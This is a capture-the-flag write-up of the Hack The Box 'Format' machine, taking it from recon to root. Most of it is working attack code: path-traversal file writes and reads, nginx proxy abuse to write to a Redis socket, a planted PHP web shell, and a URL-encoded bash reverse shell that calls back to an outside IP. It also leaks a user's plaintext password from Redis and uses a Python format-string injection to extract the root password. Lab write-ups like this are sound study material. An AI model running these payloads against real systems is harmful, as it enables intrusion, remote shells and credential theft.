# medium - Format

## User Flag

Ok, after curl-ing it, we can quickly see a host:
```bash
z➤ curl -s -i format.htb | ag http
HTTP/1.1 200 OK
<meta http-equiv="Refresh" content="0; url='http://app.microblog.htb'" />
```

Also nmap found these ports:
```bash
z➤ sudo nmap -n -Pn -sV -O -T4 format.htb
...
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp   open  http    nginx 1.18.0
3000/tcp open  http    nginx 1.18.0
```

Also curl-ing the port 3000 reveals another host:
```bash
z➤ curl -i format.htb:3000
HTTP/1.1 301 Moved Permanently
Server: nginx/1.18.0
Date: Thu, 17 Aug 2023 14:11:06 GMT
Content-Type: text/html
Content-Length: 169
Connection: keep-alive
Location: http://microblog.htb:3000/
```

So now let's add add this to our `/etc/hosts`: `10.10.11.213 format.htb app.microblog.htb microblog.htb`

Now let's review both sites. Both are Nginx, however, notice how Cookies are set:
```bash
z➤ curl -sI http://app.microblog.htb/
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Thu, 17 Aug 2023 14:13:37 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Set-Cookie: username=uf0igonsrjr7j0cplanah80ebl; path=/; domain=.microblog.htb
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache

z➤ curl -sI http://microblog.htb:3000/
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Thu, 17 Aug 2023 14:13:44 GMT
Connection: keep-alive
Set-Cookie: i_like_gitea=1a968aaba762fdd8; Path=/; HttpOnly; SameSite=Lax
```

Interested URLs scrapped:
- http://app.microblog.htb/login/
    - /dashboard
    - /login
- http://microblog.htb:3000/cooper/microblog
    - /explore/repos
    - http://microblog.htb:3000/cooper/microblog.git
- https://gitea.io
    - Version used: 1.17.3
- http://golang.org/
- https://github.com/go-gitea/gitea

### Test 001

Ok, so I went into app.microblog.htb and created a site:
{{< limg "/i/2023-08-17_10-27.png" "Site creation" >}}

After site creation you can reach your site as: `http://foo.microblog.htb/edit` or `http://foo.microblog.htb/`

Then reviewed the source code found in Gitea, this functions seems to be related from `./microblog/app/dashboard/index.php`:
```php
function addSite($site_name) {
    if(isset($_SESSION['username'])) {
        //check if site already exists
        $scan = glob('/var/www/microblog/*', GLOB_ONLYDIR);
        $taken_sites = array();
        foreach($scan as $site) {
            array_push($taken_sites, substr($site, strrpos($site, '/') + 1));
        }
        if(in_array($site_name, $taken_sites)) {
            header("Location: /dashboard?message=Sorry, that site has already been taken&status=fail");
            exit;
        }
        $redis = new Redis();
        $redis->connect('/var/run/redis/redis.sock');
	$redis->LPUSH($_SESSION['username'] . ":sites", $site_name);
        $tmp_dir = "/tmp/" . generateRandomString(7);
        system("mkdir -m 0700 " . $tmp_dir);
        system("cp -r /var/www/microblog-template/* " . $tmp_dir);
        system("chmod 500 " . $tmp_dir);
        system("chmod +w /var/www/microblog");
        system("cp -rp " . $tmp_dir . " /var/www/microblog/" . $site_name);
	system("chmod -w microblog");
	system ("chmod -R +w " . $tmp_dir);
	system("rm -r " . $tmp_dir);
        header("Location: /dashboard?message=Site added successfully!&status=success");
    }
    else {
        header("Location: /dashboard?message=Site not added, authentication failed&status=fail");
    }
}
```

As you can notice we see a potential RCE given how they use the function `system()` and the var `$site_name`. Saddenly I wasn't able to revshell it, given this php condition: `if(!preg_match('/^[a-z]+$/', $_POST['new-blog-name']) || strlen($_POST['new-blog-name']) > 50)`. 

But as per the source code, there are other posibilities as well, also notice that sunny.microblog.htb:
```bash
microblog/sunny/edit/index.php
28:        system("chmod +w /var/www/microblog/" . $blogName);
29:        system("chmod +w /var/www/microblog/" . $blogName . "/edit");
30:        system("cp /var/www/pro-files/bulletproof.php /var/www/microblog/" . $blogName . "/edit/");
31:        system("mkdir /var/www/microblog/" . $blogName . "/uploads && chmod 700 /var/www/microblog/" . $blogName . "/uploads");
32:        system("chmod -w /var/www/microblog/" . $blogName . "/edit && chmod -w /var/www/microblog/" . $blogName);

microblog/app/dashboard/index.php
77:        system("mkdir -m 0700 " . $tmp_dir);
78:        system("cp -r /var/www/microblog-template/* " . $tmp_dir);
79:        system("chmod 500 " . $tmp_dir);
80:        system("chmod +w /var/www/microblog");
81:        system("cp -rp " . $tmp_dir . " /var/www/microblog/" . $site_name);
82:     system("chmod -w microblog");
83:     system ("chmod -R +w " . $tmp_dir);
84:     system("rm -r " . $tmp_dir);

microblog-template/edit/index.php
28:        system("chmod +w /var/www/microblog/" . $blogName);
29:        system("chmod +w /var/www/microblog/" . $blogName . "/edit");
30:        system("cp /var/www/pro-files/bulletproof.php /var/www/microblog/" . $blogName . "/edit/");
31:        system("mkdir /var/www/microblog/" . $blogName . "/uploads && chmod 700 /var/www/microblog/" . $blogName . "/uploads");
32:        system("chmod -w /var/www/microblog/" . $blogName . "/edit && chmod -w /var/www/microblog/" . $blogName);
```

#### Exploiting upload images
Ok, it seems that if we are capable of uploading images we can get some revshell in the server, only Pro users can have access to the Upload feature.
```php
//add image
if (isset($_FILES['image']) && isset($_POST['id'])) {
    if(isPro() === "false") {
        print_r("Pro subscription required to upload images");
        header("Location: /edit?message=Pro subscription required&status=fail");
        exit();
    }
    $image = new Bulletproof\Image($_FILES);
    $image->setLocation(getcwd() . "/../uploads");
    $image->setSize(100, 3000000);
    $image->setMime(array('png'));

    if($image["image"]) {
        $upload = $image->upload();

        if($upload) {
            $upload_path = "/uploads/" . $upload->getName() . ".png";
            $html = "<div class = \"blog-image\"><img src = \"{$upload_path}\" /></div>";
            chdir(getcwd() . "/../content");
            $post_file = fopen("{$_POST['id']}", "w");
            fwrite($post_file, $html);
            fclose($post_file);
            $order_file = fopen("order.txt", "a");
            fwrite($order_file, $_POST['id'] . "\n");  
            fclose($order_file);
            header("Location: /edit?message=Image uploaded successfully&status=success");
        }
        else {
            header("Location: /edit?message=Image upload failed&status=fail");
        }
    }
}
```

So, how to become Pro?, check this site creation function, you will see nothing related to Pro feature.
```php
function addSite($site_name) {
    if(isset($_SESSION['username'])) {
        //check if site already exists
        $scan = glob('/var/www/microblog/*', GLOB_ONLYDIR);
        $taken_sites = array();
        foreach($scan as $site) {
            array_push($taken_sites, substr($site, strrpos($site, '/') + 1));
        }
        if(in_array($site_name, $taken_sites)) {
            header("Location: /dashboard?message=Sorry, that site has already been taken&status=fail");
            exit;
        }
        $redis = new Redis();
        $redis->connect('/var/run/redis/redis.sock');
	$redis->LPUSH($_SESSION['username'] . ":sites", $site_name);
        $tmp_dir = "/tmp/" . generateRandomString(7);
        system("mkdir -m 0700 " . $tmp_dir);
        system("cp -r /var/www/microblog-template/* " . $tmp_dir);
        system("chmod 500 " . $tmp_dir);
        system("chmod +w /var/www/microblog");
        system("cp -rp " . $tmp_dir . " /var/www/microblog/" . $site_name);
	system("chmod -w microblog");
	system ("chmod -R +w " . $tmp_dir);
	system("rm -r " . $tmp_dir);
        header("Location: /dashboard?message=Site added successfully!&status=success");
    }
    else {
        header("Location: /dashboard?message=Site not added, authentication failed&status=fail");
    }
}
```

Now check this function that checks wether a user is Pro or not:
```php
function isPro() {
    if(isset($_SESSION['username'])) {
        $redis = new Redis();
        $redis->connect('/var/run/redis/redis.sock');
        $pro = $redis->HGET($_SESSION['username'], "pro");
        return strval($pro);
    }
    return "false";
}
```
A user is not explicitely being saved as Pro=false, basically if the user is not Pro, the value can even be NULL or not exists at all in the DB (?). Somehow I need to set my self Pro=true in that Redis service (redis.sock). I will come back to this later.

I've found this function, where you can edit your site your microblog site: ./microblog-template/edit/index.php
```php
//add text
if (isset($_POST['txt']) && isset($_POST['id'])) {
    chdir(getcwd() . "/../content");
    $txt_nl = nl2br($_POST['txt']);
    $html = "<div class = \"blog-text\">{$txt_nl}</div>";
    $post_file = fopen("{$_POST['id']}", "w");
    fwrite($post_file, $html);
    fclose($post_file);
    $order_file = fopen("order.txt", "a");
    fwrite($order_file, $_POST['id'] . "\n");  
    fclose($order_file);
    header("Location: /edit?message=Section added!&status=success");
}
```

You can realize that `$post_file` var loads the content of file `fopen("{$_POST['id']}", "w")`, we can just modify `id` parameter with whatever we want:
```bash
curl -i -s -k -X $'POST' \
       -H $'Host: foo.microblog.htb' \
       -H $'Content-Type: application/x-www-form-urlencoded' \
       -b $'username=t49mkkpc4a322f9hbhpfcehjp4' \
       --data-binary $'id=../../../../../etc/passwd&txt=no+mams+wey' \
       $'http://foo.microblog.htb/edit/index.php'
```

And we will get an ugly long /etc/passwd text where we can identify users `cooper` and `git`:
```text
root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin_apt:x:100:65534::/nonexistent:/usr/sbin/nologinsystemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologinsystemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologinsystemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologinsystemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologincooper:x:1000:1000::/home/cooper:/bin/bashredis:x:103:33::/var/lib/redis:/usr/sbin/nologingit:x:104:111:Git Version Control,,,:/home/git:/bin/bashmessagebus:x:105:112::/nonexistent:/usr/sbin/nologinsshd:x:106:65534::/run/sshd:/usr/sbin/nologin_laurel:x:997:997::/var/log/laurel:/bin/false
```

Let's read `/etc/nginx/sites-enabled/default`:
```nginx
server
{
	listen 80; listen [::]:80; root /var/www/microblog/app; index index.html index.htm index-nginx-debian.html; server_name microblog.htb; location /
	{
		return 404;
	}
	location = /static/css/health/
	{
		resolver 127.0.0.1; proxy_pass http://css.microbucket.htb/health.txt;
	}
	location = /static/js/health/
	{
		resolver 127.0.0.1; proxy_pass http://js.microbucket.htb/health.txt;
	}
	location ~ /static/(.*)/(.*)
	{
		resolver 127.0.0.1; proxy_pass http://$1.microbucket.htb/$2;
	}
}
```

That `/static/(.*)/(.*)` seems vulnerable to path traversal vulnerability. Thanks to curl we can write to that redis socket: `curl -X HSET "http://microblog.htb/static/unix:%2Fvar%2Frun%2Fredis%2Fredis.sock:foo%20pro%20true%20a/uri"`
And we are Pro now.

Now we are able to upload images to folder: http://foo.microblog.htb/uploads/64de8036164f10.17787109_ghmnjlkopiefq.png `/uploads/`
```bash
curl -i -s -k -X $'POST' \
...
...
    -b $'username=t49mkkpc4a322f9hbhpfcehjp4' \
    --data-binary $'id=/var/www/microblog/foo/uploads/z.php&txt=<?php if(isset($_REQUEST[\'cmd\'])){ echo \"<pre>\"; $cmd = ($_REQUEST[\'cmd\']); system($cmd); echo \"</pre>\"; die; }?>' \
    $'http://foo.microblog.htb/edit/index.php'

# Testing the PHP script
~z➤ curl -s 'http://foo.microblog.htb/uploads/z.php?cmd=id' | elinks --dump
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Ok, let's change the z.php file content: `<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.3/55555 0>&1'");?>`
```bash
id=/var/www/microblog/foo/uploads/z.php&txt=%3c%3f%70%68%70%20%65%78%65%63%28%22%2f%62%69%6e%2f%62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%31%30%2e%31%34%2e%33%2f%35%35%35%35%35%20%30%3e%26%31%27%22%29%3b%3f%3e
```

And now we have a nice rev shell:
```bash
~z➤ nc -lvnp 55555
Connection from 10.10.11.213:36906
bash: cannot set terminal process group (619): Inappropriate ioctl for device
bash: no job control in this shell
www-data@format:~/microblog/foo/uploads$ pwd
pwdid
/var/www/microblog/foo/uploads
www-data@format:~/microblog/foo/uploads$
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Exploring redis:
```bash
www-data@format:~/microblog/foo/uploads$ redis-cli -s /var/run/redis/redis.sock
<foo/uploads$ redis-cli -s /var/run/redis/redis.sock
> keys *
cooper.dooper
cooper.dooper:sites

> hgetall cooper.dooper
username
cooper.dooper
password
zooperdoopercooper
first-name
Cooper
last-name
Dooper
pro
false

# Now we are in
z➤ ssh cooper@microblog.htb
cooper@format:~$ id
uid=1000(cooper) gid=1000(cooper) groups=1000(cooper)
cooper@format:~$ ls
user.txt
```

## Root Flag

We have sudo for `/usr/bin/license`!
```bash
cooper@format:~$ sudo -l
[sudo] password for cooper:
Matching Defaults entries for cooper on format:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User cooper may run the following commands on format:
    (root) /usr/bin/license


cooper@format:~$ sudo /usr/bin/license -h
usage: license [-h] (-p username | -d username | -c license_key)

Microblog license key manager

optional arguments:
  -h, --help            show this help message and exit
  -p username, --provision username
                        Provision license key for specified user
  -d username, --deprovision username
                        Deprovision license key for specified user
  -c license_key, --check license_key
                        Check if specified license key is valid
```

That `license` is a py script:
```python
cooper@format:~$ cat /usr/bin/license
#!/usr/bin/python3

import base64
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.fernet import Fernet
import random
import string
from datetime import date
import redis
import argparse
import os
import sys

class License():
    def __init__(self):
        chars = string.ascii_letters + string.digits + string.punctuation
        self.license = ''.join(random.choice(chars) for i in range(40))
        self.created = date.today()

if os.geteuid() != 0:
    print("")
    print("Microblog license key manager can only be run as root")
    print("")
    sys.exit()

parser = argparse.ArgumentParser(description='Microblog license key manager')
group = parser.add_mutually_exclusive_group(required=True)
group.add_argument('-p', '--provision', help='Provision license key for specified user', metavar='username')
group.add_argument('-d', '--deprovision', help='Deprovision license key for specified user', metavar='username')
group.add_argument('-c', '--check', help='Check if specified license key is valid', metavar='license_key')
args = parser.parse_args()

r = redis.Redis(unix_socket_path='/var/run/redis/redis.sock')

secret = [line.strip() for line in open("/root/license/secret")][0]
secret_encoded = secret.encode()
salt = b'microblogsalt123'
kdf = PBKDF2HMAC(algorithm=hashes.SHA256(),length=32,salt=salt,iterations=100000,backend=default_backend())
encryption_key = base64.urlsafe_b64encode(kdf.derive(secret_encoded))

f = Fernet(encryption_key)
l = License()

#provision
if(args.provision):
    user_profile = r.hgetall(args.provision)
    if not user_profile:
        print("")
        print("User does not exist. Please provide valid username.")
        print("")
        sys.exit()
    existing_keys = open("/root/license/keys", "r")
    all_keys = existing_keys.readlines()
    for user_key in all_keys:
        if(user_key.split(":")[0] == args.provision):
            print("")
            print("License key has already been provisioned for this user")
            print("")
            sys.exit()
    prefix = "microblog"
    username = r.hget(args.provision, "username").decode()
    firstlast = r.hget(args.provision, "first-name").decode() + r.hget(args.provision, "last-name").decode()
    license_key = (prefix + username + "{license.license}" + firstlast).format(license=l)
    print("")
    print("Plaintext license key:")
    print("------------------------------------------------------")
    print(license_key)
    print("")
    license_key_encoded = license_key.encode()
    license_key_encrypted = f.encrypt(license_key_encoded)
    print("Encrypted license key (distribute to customer):")
    print("------------------------------------------------------")
    print(license_key_encrypted.decode())
    print("")
    with open("/root/license/keys", "a") as license_keys_file:
        license_keys_file.write(args.provision + ":" + license_key_encrypted.decode() + "\n")

#deprovision
if(args.deprovision):
    print("")
    print("License key deprovisioning coming soon")
    print("")
    sys.exit()

#check
if(args.check):
    print("")
    try:
        license_key_decrypted = f.decrypt(args.check.encode())
        print("License key valid! Decrypted value:")
        print("------------------------------------------------------")
        print(license_key_decrypted.decode())
    except:
        print("License key invalid")
    print("")
```

So this script is reading data from Redis. Notice this:
```python
...
    username = r.hget(args.provision, "username").decode()
    firstlast = r.hget(args.provision, "first-name").decode() + r.hget(args.provision, "last-name").decode()
    license_key = (prefix + username + "{license.license}" + firstlast).format(license=l)
...
```

So what if we dump the secret value by modifying the first-name to `{license.__init__.__globals__[secret_encoded]}` in our existing site:
```bash
cooper@format:~$ redis-cli -s /var/run/redis/redis.sock
redis /var/run/redis/redis.sock> HMSET foo first-name "{license.__init__.__globals__[secret_encoded]}" last-name foo username foo
OK
redis /var/run/redis/redis.sock> exit
```

Now let's try to check the license for our `foo` user:
```bash
cooper@format:~$ sudo /usr/bin/license -p foo

Plaintext license key:
------------------------------------------------------
microblogfooC>ZZNBP)nzjMVI*eECtC,4_~_rh}(AgvM^f-_<k}b'unCR4ckaBL3Pa$$w0rd'foo

Encrypted license key (distribute to customer):
------------------------------------------------------
gAAAAABk3oTitvSJmQSl65MfG4KqjkonzL1T112iQGinpYCXe9lfmOCBma0UjB-9pf51SrxvFOIL97zaCIiYOfvwgbEa4vp2nnu--pm3ku__ZkWLsDxVvBsCmaD1_6q4PRukw-i_wczWUP4CCXGBlt2Xw7niIX2vr4FvgtoSgXk3zquLYPj0TdI=
```

We can see a key/password that turns out to be the root's password :D
```bash
z➤ ssh root@microblog.htb
root@format:~# ls
license  reset  root.txt
root@format:~# id
uid=0(root) gid=0(root) groups=0(root)
```

## TODOs
- Review Redis sock via unix socket/protocol access
- Review python format string vulnerabilities
